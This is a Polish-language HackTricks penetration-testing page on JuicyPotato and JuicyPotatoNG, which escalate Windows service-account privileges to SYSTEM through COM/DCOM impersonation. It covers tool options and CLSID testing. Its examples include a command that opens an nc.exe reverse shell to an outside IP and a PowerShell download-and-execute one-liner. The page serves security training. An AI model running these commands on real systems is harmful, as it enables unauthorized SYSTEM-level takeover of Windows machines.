# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is legacy. It generally works on Windows versions up to Windows 10 1803 / Windows Server 2016. Microsoft changes shipped starting in Windows 10 1809 / Server 2019 broke the original technique. For those builds and newer, consider modern alternatives such as PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato and others. See the page below for up-to-date options and usage.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (nadużywanie "golden privileges") <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Słodsza wersja_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, z odrobiną "soku", tj. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Szybkie uwagi o kompatybilności

- Działa niezawodnie do Windows 10 1803 i Windows Server 2016, gdy bieżący kontekst ma SeImpersonatePrivilege lub SeAssignPrimaryTokenPrivilege.
- Nie działa w wyniku wzmocnień bezpieczeństwa w Windows 10 1809 / Windows Server 2019 i nowszych. Dla tych buildów preferuj alternatywy wymienione powyżej.

### Podsumowanie <a href="#summary" id="summary"></a>

[**Z pliku Readme juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) i jego [warianty](https://github.com/decoder-it/lonelypotato) wykorzystują łańcuch eskalacji uprawnień oparty na [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) mającej nasłuch MiTM na `127.0.0.1:6666` oraz gdy masz uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`. Podczas przeglądu konfiguracji Windows znaleźliśmy środowisko, w którym `BITS` został celowo wyłączony, a port `6666` był zajęty.

Postanowiliśmy "uzbroić" [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **poznaj Juicy Potato**.

> Dla teorii zobacz [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) i prześledź łańcuch linków oraz odnośników.

Odkryliśmy, że oprócz `BITS` istnieje kilka serwerów COM, które możemy wykorzystać. Muszą one jedynie:

1. być możliwe do zainicjowania przez bieżącego użytkownika, zwykle “service user”, który posiada uprawnienia do impersonacji
2. zaimplementować interfejs `IMarshal`
3. działać jako użytkownik z podwyższonymi uprawnieniami (SYSTEM, Administrator, …)

Po testach uzyskaliśmy i sprawdziliśmy obszerną listę [interesujących CLSID-ów](http://ohpe.it/juicy-potato/CLSID/) na kilku wersjach Windows.

### Szczegóły <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato pozwala na:

- **Docelowy CLSID** _wybierz dowolny CLSID, który chcesz._ [_Tutaj_](http://ohpe.it/juicy-potato/CLSID/) _znajdziesz listę uporządkowaną według systemu operacyjnego._
- **Port nasłuchu COM** _określ port nasłuchu COM, którego chcesz użyć (zamiast na stałe ustawionego 6666)_
- **Adres IP nasłuchu COM** _zwiąż serwer z dowolnym adresem IP_
- **Tryb tworzenia procesu** _w zależności od uprawnień podszywanego użytkownika możesz wybrać:_
- `CreateProcessWithToken` (wymaga `SeImpersonate`)
- `CreateProcessAsUser` (wymaga `SeAssignPrimaryToken`)
- `both`
- **Proces do uruchomienia** _uruchom plik wykonywalny lub skrypt, jeśli eksploatacja zakończy się sukcesem_
- **Argument procesu** _dostosuj argumenty uruchamianego procesu_
- **Adres serwera RPC** _dla ukrytego podejścia możesz uwierzytelnić się na zewnętrznym serwerze RPC_
- **Port serwera RPC** _przydatne, jeśli chcesz uwierzytelnić się na zewnętrznym serwerze, a zapora blokuje port `135`…_
- **TRYB TESTOWY** _głównie do celów testowych, np. testowania CLSID-ów. Tworzy DCOM i wypisuje użytkownika tokenu. Zobacz_ [_tutaj do testów_](http://ohpe.it/juicy-potato/Test/)

### Użycie <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Ostatnie uwagi <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Jeśli użytkownik ma uprawnienia `SeImpersonate` lub `SeAssignPrimaryToken`, to jesteś **SYSTEM**.

Praktycznie niemożliwe jest zapobieżenie nadużyciom wszystkich tych COM Servers. Możesz rozważyć modyfikowanie uprawnień tych obiektów za pomocą `DCOMCNFG`, ale powodzenia — to będzie trudne.

Rzeczywiste rozwiązanie polega na zabezpieczeniu wrażliwych kont i aplikacji, które działają pod kontami `* SERVICE`. Zatrzymanie `DCOM` z pewnością utrudniłoby ten exploit, ale mogłoby mieć poważny wpływ na system operacyjny.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG ponownie wprowadza eskalację uprawnień lokalnych w stylu JuicyPotato na nowoczesnych systemach Windows, łącząc:
- Rozwiązanie DCOM OXID do lokalnego serwera RPC na wybranym porcie, omijając stary, hardcoded nasłuch 127.0.0.1:6666.
- Hook SSPI do przechwycenia i podszycia się pod przychodzące uwierzytelnienie SYSTEM bez potrzeby użycia RpcImpersonateClient, co również umożliwia CreateProcessAsUser, gdy obecne jest tylko uprawnienie SeAssignPrimaryTokenPrivilege.
- Sztuczki spełniające ograniczenia aktywacji DCOM (np. dawny wymóg grupy INTERACTIVE przy celowaniu w klasy PrintNotify / ActiveX Installer Service).

Ważne uwagi (zachowanie zmienia się między buildami):
- Wrzesień 2022: Początkowa technika działała na wspieranych systemach Windows 10/11 i Server, wykorzystując “INTERACTIVE trick”.
- Styczeń 2023 — aktualizacja od autorów: Microsoft później zablokował INTERACTIVE trick. Inny CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) przywraca możliwość eksploatacji, ale tylko na Windows 11 / Server 2022, według ich wpisu.

Podstawowe użycie (więcej flag w pomocy):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Jeśli celujesz w Windows 10 1809 / Server 2019, gdzie klasyczny JuicyPotato jest załatany, preferuj alternatywy podlinkowane powyżej (RoguePotato, PrintSpoofer, EfsPotato/GodPotato itp.). NG może być sytuacyjne w zależności od builda i stanu usługi.

## Przykłady

Uwaga: Odwiedź [this page](https://ohpe.it/juicy-potato/CLSID/) , aby uzyskać listę CLSID-ów do wypróbowania.

### Uzyskaj nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Uruchom nowe CMD (jeśli masz dostęp przez RDP)

![](<../../images/image (300).png>)

## Problemy z CLSID

Często domyślny CLSID używany przez JuicyPotato **nie działa** i exploit kończy się niepowodzeniem. Zwykle potrzeba wielu prób, aby znaleźć **działający CLSID**. Aby uzyskać listę CLSID do wypróbowania dla konkretnego systemu operacyjnego, odwiedź tę stronę:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Sprawdzanie CLSID**

Najpierw będziesz potrzebować kilku plików wykonywalnych oprócz juicypotato.exe.

Pobierz [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) i załaduj go do swojej sesji PS, a także pobierz i uruchom [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ten skrypt utworzy listę możliwych CLSID do przetestowania.

Następnie pobierz [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) (zmień ścieżkę do listy CLSID i do pliku wykonywalnego juicypotato) i uruchom go. Zacznie testować każdy CLSID, a **gdy numer portu się zmieni, będzie to oznaczać, że CLSID zadziałał**.

**Sprawdź** działające CLSID-y **używając parametru -c**

## Referencje

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
